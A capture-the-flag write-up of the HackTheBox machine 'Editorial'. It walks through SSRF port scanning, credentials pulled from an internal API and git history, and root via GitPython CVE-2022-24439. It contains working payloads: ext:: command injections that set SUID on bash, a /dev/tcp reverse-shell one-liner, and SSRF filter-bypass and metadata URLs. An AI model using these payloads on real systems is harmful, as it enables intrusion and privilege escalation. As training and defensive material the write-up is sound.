# HTB - Editorial - 10.129.2.228

### Machine Info

* **Difficulty:** Easy
* **OS:** Linux (Ubuntu)
* **IP:** 10.129.2.228
* **Key Skills:** SSRF exploitation, Internal API enumeration, Git history analysis, GitPython RCE (CVE-2022-24439)

### Overview

Editorial is an easy Linux box that demonstrates Server-Side Request Forgery (SSRF) exploitation to access internal services. The attack path involves discovering an SSRF vulnerability in a book cover upload feature, enumerating internal API endpoints to find credentials, using Git history to discover production credentials, and finally exploiting a GitPython vulnerability (CVE-2022-24439) via sudo permissions. It's a great box for learning SSRF and post-exploitation enumeration techniques.

**Key Concepts:**

* Server-Side Request Forgery (SSRF)
* Internal port scanning via SSRF
* API endpoint enumeration
* Git repository history analysis
* GitPython ext protocol exploitation (CVE-2022-24439)
* Sudo privilege escalation

**Common Ports:**

* **22/TCP** - SSH (OpenSSH 8.9p1)
* **80/TCP** - HTTP (nginx 1.18.0)

***

### Exploitation Workflow Summary

1. **Initial Enumeration** ├─ Nmap reveals SSH and HTTP ├─ Web application: editorial.htb └─ Discover book cover upload feature
2. **SSRF Discovery** ├─ Upload feature accepts URL for book cover ├─ Test internal URL access ├─ Port scan localhost via SSRF └─ Discover internal API on port 5000
3. **API Enumeration** ├─ Access API documentation endpoint ├─ Enumerate available endpoints ├─ Find credentials in /api/latest/metadata/messages/authors └─ Obtain dev user credentials
4. **Initial Access** ├─ SSH as dev user ├─ Enumerate home directory ├─ Discover Git repository in \~/apps └─ Capture user flag
5. **Lateral Movement** ├─ Analyze Git commit history ├─ Find production credentials in old commit ├─ Switch to prod user └─ Enumerate sudo permissions
6. **Privilege Escalation** ├─ Identify sudo permission for clone\_prod\_change.py ├─ Analyze GitPython vulnerability (CVE-2022-24439) ├─ Exploit ext protocol for command execution └─ Gain root access

***

### Initial Enumeration

#### Port Scanning

```bash
nmap -p- -Pn -sCV 10.129.2.228 -oN editorial.tcp
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
```

**Add to hosts:**

```bash
echo "10.129.2.228 editorial.htb" | sudo tee -a /etc/hosts
```

#### Web Application

**Technology stack:**

* nginx 1.18.0
* Python backend (Flask/similar)
* Book publishing platform

**Key feature discovered:**

* `/upload` - Book cover upload functionality
* Accepts both file upload and URL for cover image

***

### SSRF Exploitation

#### Understanding the Vulnerability

**What is SSRF?**

Server-Side Request Forgery allows an attacker to make the server perform requests on their behalf. This can access internal services not exposed to the internet.

**Vulnerable endpoint:**

```
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Type: multipart/form-data

bookurl=http://127.0.0.1:<PORT>
```

**Normal behavior:**

* Server fetches image from provided URL
* Returns path to saved image: `/static/images/unsplash_photo_xxx.jpeg`

**SSRF behavior:**

* When URL points to internal service, server fetches and returns content
* Different response indicates open port

#### Internal Port Scanning

**Create request template** (`request.txt`):

```http
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Type: multipart/form-data; boundary=---------------------------17227051210845347502863409435

-----------------------------17227051210845347502863409435
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
-----------------------------17227051210845347502863409435
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


-----------------------------17227051210845347502863409435--
```

**Fuzz internal ports:**

```bash
ffuf -u http://editorial.htb/upload-cover -request request.txt -w <(seq 0 65535) -ac
```

**Alternative with Burp Intruder:**

1. Capture upload request in Burp
2. Set payload position on port number
3. Use numbers payload 1-65535
4. Filter by response length differences

**Result:** Port 5000 returns different response (internal API)

***

### Internal API Enumeration

#### Accessing the API

**Request internal API via SSRF:**

```http
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Type: multipart/form-data; boundary=...

bookurl=http://127.0.0.1:5000
```

**Response returns file path:**

```
/static/uploads/abc123def456
```

**Download the response:**

```bash
curl http://editorial.htb/static/uploads/abc123def456
```

#### API Documentation

**Endpoint:** `http://127.0.0.1:5000/`

**Response:**

```json
{
  "messages": [
    {
      "promotions": {
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    }
  ]
}
```

#### Extracting Credentials

**Request authors endpoint via SSRF:**

```
bookurl=http://127.0.0.1:5000/api/latest/metadata/messages/authors
```

**Response:**

```json
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board...

Your login credentials for our internal forum and authors site are:
Username: dev
Password: dev080217_devAPI!@

Please be sure to change your password as soon as possible for security purposes.

Best regards, Editorial Tiempo Arriba Team."
}
```

**Credentials found:**

```
dev:dev080217_devAPI!@
```

***

### Initial Access

#### SSH Connection

```bash
ssh dev@10.129.2.228
Password: dev080217_devAPI!@
```

#### User Flag

```bash
cat ~/user.txt
```

**Flag:**

```
6ae4f7dd15837850674fa55330e549e8
```

***

### Lateral Movement - Git History Analysis

#### Discovering Git Repository

**Enumerate home directory:**

```bash
dev@editorial:~$ ls -la apps/
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5  2024 .
drwxr-x--- 4 dev dev 4096 Jun  5  2024 ..
drwxr-xr-x 8 dev dev 4096 Jun  5  2024 .git
```

**Git repository found!**

#### Analyzing Git Configuration

```bash
dev@editorial:~/apps/.git$ cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[user]
        email = dev-carlos.valderrama@tiempoarriba.htb
        name = dev-carlos.valderrama
```

#### Viewing Commit History

**Check commit log:**

```bash
cd ~/apps
git log --oneline
```

**Output:**

```
8ad0f31 fix: bugfix in api port endpoint
dfef9f2 change: remove debug and update api port
b73481b change(api): downgrading prod to dev
1e84a03 feat: create api to editorial info
3251ec9 feat: create editorial app
```

**Interesting commit:** `b73481b change(api): downgrading prod to dev`

#### Extracting Credentials from History

**View commit differences:**

```bash
git log -p
```

**Or view specific commit:**

```bash
git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
```

**Found in old commit:**

```python
+@app.route(api_route + '/authors/message', methods=['GET'])
+def api_mail_new_authors():
+    return jsonify({
+        'template_mail_message': "...
Username: prod
Password: 080217_Producti0n_2023!@
..."
+    }) # TODO: replace dev credentials when checks pass
```

**Production credentials found:**

```
prod:080217_Producti0n_2023!@
```

#### Switching to prod User

```bash
su - prod
Password: 080217_Producti0n_2023!@
```

**Success!**

***

### Privilege Escalation - GitPython RCE

#### Sudo Enumeration

```bash
prod@editorial:~$ sudo -l
```

**Output:**

```
User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

#### Analyzing the Script

```bash
prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
```

**Script content:**

```python
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

#### Understanding the Vulnerability

**CVE-2022-24439 - GitPython Remote Code Execution**

**Vulnerable code:**

```python
multi_options=["-c protocol.ext.allow=always"]
```

**What this does:**

* Enables the `ext::` protocol in Git
* `ext::` allows executing arbitrary shell commands
* Combined with user-controlled input = RCE

**Exploit format:**

```
ext::sh -c <command>
```

**Note:** Spaces must be replaced with `%` due to URL parsing

#### Exploitation

**Method 1: Direct SUID bash:**

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% u+s% /bin/bash'
```

Then:

```bash
/bin/bash -p
```

**Method 2: Create SUID copy (safer):**

```bash
# Copy bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cp% /bin/bash% /tmp/rootbash'

# Set SUID bit
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% u+s% /tmp/rootbash'

# Execute
/tmp/rootbash -p
```

**Method 3: Reverse shell:**

```bash
# On attacker machine
nc -lvnp 4444

# On target
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% -c% "bash% -i% >&% /dev/tcp/10.10.14.X/4444% 0>&1"'
```

#### Root Access

```bash
rootbash-5.1# whoami
root

rootbash-5.1# cat /root/root.txt
1301e52d51111a5393d6b5a65df2adcc
```

***

### Quick Reference

#### SSRF Port Scanning

```bash
# Create wordlist of ports
seq 1 65535 > ports.txt

# Fuzz with ffuf
ffuf -u http://target/endpoint -request request.txt -w ports.txt -ac

# Manual test
curl -X POST http://target/upload -d "url=http://127.0.0.1:PORT"
```

#### Git History Analysis

```bash
# View all commits
git log --oneline

# View commit with diff
git show <commit_hash>

# Search for strings in history
git log -p | grep -i password

# Show all changes across history
git log -p --all

# Find deleted files
git log --diff-filter=D --summary

# Search commit messages
git log --grep="password"
```

#### GitPython CVE-2022-24439

```bash
# Basic command execution (spaces = %)
ext::sh -c <command>

# Examples
ext::sh -c id
ext::sh -c whoami
ext::sh -c chmod% u+s% /bin/bash
ext::sh -c cp% /bin/bash% /tmp/pwned
```

#### SSRF Testing

```bash
# Test for SSRF
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://127.1
http://127.0.0.1:22  # SSH banner
http://127.0.0.1:80  # Internal web
http://169.254.169.254  # Cloud metadata

# Bypass filters
http://127.0.0.1.nip.io
http://localtest.me
http://127。0。0。1  # Unicode dots
```

***

### Troubleshooting

#### SSRF Not Working

**Problem:** Server doesn't fetch URL

**Solution:**

```bash
# Try different URL formats
http://127.0.0.1:5000
http://localhost:5000
http://0.0.0.0:5000

# Check if DNS resolution works
http://attacker.com (point to 127.0.0.1)

# Try file:// protocol
file:///etc/passwd
```

#### Port Scan Taking Too Long

**Problem:** Scanning all 65535 ports is slow

**Solution:**

```bash
# Scan common ports first
ffuf -w common_ports.txt ...

# Use threading
ffuf -t 50 ...

# Focus on interesting ranges
seq 1 10000 > ports.txt
```

#### Git History Not Showing Secrets

**Problem:** Credentials not visible in log

**Solution:**

```bash
# Check all branches
git branch -a
git log --all -p

# Check stashed changes
git stash list
git stash show -p

# Check reflog
git reflog

# Search blob content
git rev-list --all | xargs git grep "password"
```

#### GitPython Exploit Fails

**Problem:** Command not executing

**Solution:**

```bash
# Verify spaces are replaced with %
ext::sh -c echo% test  # Correct
ext::sh -c echo test   # Wrong

# Try different command formats
ext::sh -c "command"
ext::sh -c 'command'

# Check if ext protocol is actually enabled
# Look for: protocol.ext.allow=always in script

# Test simple command first
ext::sh -c id
```

***

### Key Takeaways

**What we learned:**

1. **SSRF exploitation** - Upload features accepting URLs are common SSRF vectors; always test for internal service access
2. **Internal port scanning** - SSRF can enumerate internal services by observing response differences
3. **API enumeration** - Internal APIs often contain sensitive information including credentials
4. **Git history analysis** - Credentials and secrets often exist in Git commit history even after removal
5. **GitPython vulnerability** - CVE-2022-24439 allows RCE when `protocol.ext.allow=always` is set
6. **Sudo privilege escalation** - Always analyze scripts that can be run with sudo for command injection

**Attack chain summary:** SSRF in upload feature → Internal port scan → API discovery → Credential extraction → SSH access → Git history analysis → Production credentials → Sudo GitPython RCE → Root

**Defense recommendations:**

* Validate and sanitize URLs in upload features
* Block internal IP ranges in outbound requests
* Don't expose internal APIs even locally
* Never commit credentials to Git repositories
* Use Git pre-commit hooks to detect secrets
* Update GitPython to patched version
* Avoid `protocol.ext.allow=always` in Git operations
* Limit sudo permissions and audit scripts
* Use secret management solutions instead of hardcoded credentials

***

### Related Topics

* \[\[SSRF Exploitation]]
* \[\[Internal Port Scanning]]
* \[\[Git History Analysis]]
* \[\[GitPython CVE-2022-24439]]
* \[\[Sudo Privilege Escalation]]

***

### Tags

\#ssrf #git #gitpython #cve-2022-24439 #api-enumeration #credential-exposure #linux #privilege-escalation #oscp

***
